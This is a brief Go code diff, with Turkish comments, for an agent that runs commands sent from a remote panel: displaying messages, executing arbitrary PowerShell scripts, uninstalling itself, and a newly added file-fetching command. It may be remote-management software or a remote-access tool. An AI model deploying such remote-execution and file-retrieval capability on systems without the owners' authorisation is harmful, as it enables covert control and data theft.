@@ -13,7 +13,7 @@ import (
 )
 
 // execute panelden gelen bir komutu çalıştırır ve çıktısını döner.
-func execute(c command) (string, error) {
+func (a *agent) execute(c command) (string, error) {
 	switch c.Type {
 	case "message":
 		title := c.Args["title"]
@@ -37,6 +37,8 @@ func execute(c command) (string, error) {
 	case "powershell":
 		timeout := time.Duration(atoiDefault(c.Args["timeout"], 300)) * time.Second
 		return runPowerShell(c.Args["script"], timeout)
+	case "fetch_file":
+		return fetchFile(a, c.Args)
 	case "uninstall":
 		// Sonuç bir sonraki bağlantıda panele gitsin diye kısa bir süre sonra kaldır.
 		go func() {
